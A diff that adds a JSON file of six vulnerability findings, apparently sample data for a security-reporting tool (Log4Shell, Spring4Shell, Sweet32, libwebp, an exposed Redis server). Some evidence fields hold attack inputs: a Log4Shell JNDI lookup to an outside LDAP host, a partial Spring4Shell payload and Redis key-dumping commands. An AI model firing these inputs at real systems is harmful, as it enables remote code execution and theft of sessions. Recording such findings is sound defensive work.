@@ -1,0 +1,112 @@
+[
+  {
+    "id": "ADV-001",
+    "title": "Apache Log4j2 Remote Code Execution (Log4Shell)",
+    "category": "CVE",
+    "severity": "CRITICAL",
+    "cve_id": "CVE-2021-44228",
+    "cvss_score": 10.0,
+    "asset": "api-gateway.prod.corp.com",
+    "component": "log4j-core-2.14.1.jar",
+    "endpoint": "POST /api/v1/auth/tokens",
+    "evidence": {
+      "injected_payload": "${jndi:ldap://198.51.100.24:1389/Exploit}",
+      "telemetry": "Outbound LDAP SYN packet observed and blocked by egress firewall"
+    },
+    "metadata": {
+      "environment": "production",
+      "tags": ["rce", "critical-infrastructure", "java"]
+    }
+  },
+  {
+    "id": "ADV-002",
+    "title": "Spring Framework Remote Code Execution (Spring4Shell)",
+    "category": "CVE",
+    "severity": "CRITICAL",
+    "cve_id": "CVE-2022-22965",
+    "cvss_score": 9.8,
+    "asset": "billing-portal.prod.company.io",
+    "component": "spring-beans-5.3.17.jar",
+    "endpoint": "POST /billing/submit",
+    "evidence": {
+      "injected_payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=...",
+      "telemetry": "Webshell creation attempt logged in access log"
+    },
+    "metadata": {
+      "environment": "production",
+      "tags": ["rce", "spring", "java", "critical-infrastructure"]
+    }
+  },
+  {
+    "id": "ADV-003",
+    "title": "Apple WebKit / Kernel State Memory Flaw (Operation Triangulation)",
+    "category": "CVE",
+    "severity": "MEDIUM",
+    "cve_id": "CVE-2023-38606",
+    "cvss_score": 5.5,
+    "asset": "executive-mdm.fleet.corp.net",
+    "component": "kernel / webkit",
+    "endpoint": "MDM Device Profile Enrollment",
+    "evidence": {
+      "telemetry": "Zero-click exploit telemetry detected by endpoint protection agent"
+    },
+    "metadata": {
+      "environment": "production",
+      "tags": ["kernel", "zero-day", "apt", "critical-infrastructure"]
+    }
+  },
+  {
+    "id": "ADV-004",
+    "title": "Sweet32 Birthday Attack on 64-bit Block Ciphers (3DES / Blowfish)",
+    "category": "SSL/TLS Issues",
+    "severity": "MEDIUM",
+    "cve_id": "CVE-2016-2183",
+    "cvss_score": 5.9,
+    "asset": "legacy-vpn-gateway.internal.corp",
+    "component": "OpenSSL 1.0.2g",
+    "endpoint": "https://legacy-vpn-gateway.internal.corp:443",
+    "evidence": {
+      "ciphers": "TLS_RSA_WITH_3DES_EDE_CBC_SHA supported"
+    },
+    "metadata": {
+      "environment": "staging",
+      "tags": ["crypto", "sweet32", "internal"]
+    }
+  },
+  {
+    "id": "ADV-005",
+    "title": "Google Chromium / libwebp Heap Buffer Overflow",
+    "category": "CVE",
+    "severity": "HIGH",
+    "cve_id": "CVE-2023-4863",
+    "cvss_score": 8.8,
+    "asset": "image-processing-worker.prod.cloud",
+    "component": "libwebp.so.6",
+    "endpoint": "POST /api/v2/images/render",
+    "evidence": {
+      "telemetry": "Process crash (SIGSEGV) during malformed lossless WebP parsing"
+    },
+    "metadata": {
+      "environment": "production",
+      "tags": ["memory-corruption", "rce", "cisa-kev"]
+    }
+  },
+  {
+    "id": "ADV-006",
+    "title": "Unauthenticated Production Redis Server Exposed Publicly",
+    "category": "Exposed Services",
+    "severity": "CRITICAL",
+    "cve_id": null,
+    "cvss_score": 9.8,
+    "asset": "cache-01.us-east.prod.net",
+    "component": "Redis 6.2.6",
+    "endpoint": "redis://54.210.88.19:6379",
+    "evidence": {
+      "unauthenticated_commands": "PING -> PONG; KEYS session:* returned 14,000+ session keys"
+    },
+    "metadata": {
+      "environment": "production",
+      "tags": ["redis", "pii-leak", "critical-infrastructure"]
+    }
+  }
+]
